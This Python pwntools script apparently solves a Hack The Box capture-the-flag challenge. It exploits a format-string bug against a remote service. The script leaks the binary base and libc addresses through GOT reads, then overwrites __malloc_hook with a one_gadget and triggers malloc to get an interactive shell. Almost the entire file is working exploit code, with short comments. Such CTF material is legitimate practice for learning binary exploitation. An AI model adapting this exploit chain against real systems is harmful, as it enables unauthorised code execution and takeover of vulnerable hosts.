import struct 
import socket
import sys
import binascii
from pwn import *

def pack(a):
    return struct.pack("Q", a)

def unpack_from_percentage_p(a):
    return struct.unpack(">Q", a)[0]

def leak_libc_function(got_offset, conn, function_name):
    read_address = binary_base_address + got_offset 
    buf = b""
    buf += b"%7$s" # 7th argument is read_address
    buf += b"A"*(8 - len(buf)) # padding 
    buf += pack(read_address) # read address is put after because it contains NULL, otherwise it stops printf
    buf += b"\n"
    conn.send(buf)
    address = conn.recv(6)[::-1].hex()
    address = binascii.unhexlify(b"00"*2 + bytes(address, "ascii"))
    address = unpack_from_percentage_p(address)
    print("{} address: {}".format(function_name, hex(address)))
    conn.recv(512)
    return address


connection = "68.183.45.190:31267".split(":")
host = connection[0]
port = connection[1]

#with socket.create_connection((host, port)) as conn:
with remote(host, port) as conn:
    buf = b""

    # leak return address 
    index = str(41).encode("ascii")
    buf += b"%" + index + b"$p " + b"\n"
    conn.send(buf)
    ret_address = str(conn.recv(512)).split(" ")[0].replace("b'0x", "")
    ret_address = binascii.unhexlify(b"00"*2 + bytes(ret_address, "ascii"))
    ret_address = unpack_from_percentage_p(ret_address)

    # compute binary base address 
    ret_address_offset = 0x12b3
    binary_base_address = ret_address - ret_address_offset
    print("Binary base address: {}".format(hex(binary_base_address)))


    # the version of libc is needed
    # we can use libc database https://libc.rip/

    # leak address of printf, fgets and setvbuf, using got.
    # this three function are needed in order to have only one candidate libc
    print()
    printf_got_offset = 0x3fc0
    printf_address = leak_libc_function(printf_got_offset, conn, "Printf")

    fgets_got_offset = 0x3fc8
    leak_libc_function(fgets_got_offset, conn, "Fgets")

    setvbuf_got_offset = 0x3fd0
    leak_libc_function(setvbuf_got_offset, conn, "Setvbuf")

    # libc version turned out to be libc6_2.27-3ubuntu1_amd64.so

    # now we can easily compute the libc base address (after downloading the resulting libc)
    print()
    printf_offset = 0x64e80
    libc_base_address = printf_address - printf_offset
    print("Libc base address: {}".format(hex(libc_base_address)))

    # compute malloc hook address
    malloc_hook_offset = 0x3ebc30
    malloc_hook_address = libc_base_address + malloc_hook_offset

    # one gadget 
    one_gadget_offset = 0x4f322
    one_gadget_address = libc_base_address + one_gadget_offset
    print("One gadget address: {}".format(hex(one_gadget_address)))

    writes = { malloc_hook_address : one_gadget_address }
    context.bits = 64
    payload = fmtstr_payload(6, writes, 0, write_size='short') + b"\n"
    conn.send(payload)

    # trigger printf to call malloc
    conn.send(b"%70000c")

    conn.interactive()

    # HTB{mall0c_h00k_f0r_th3_w1n!}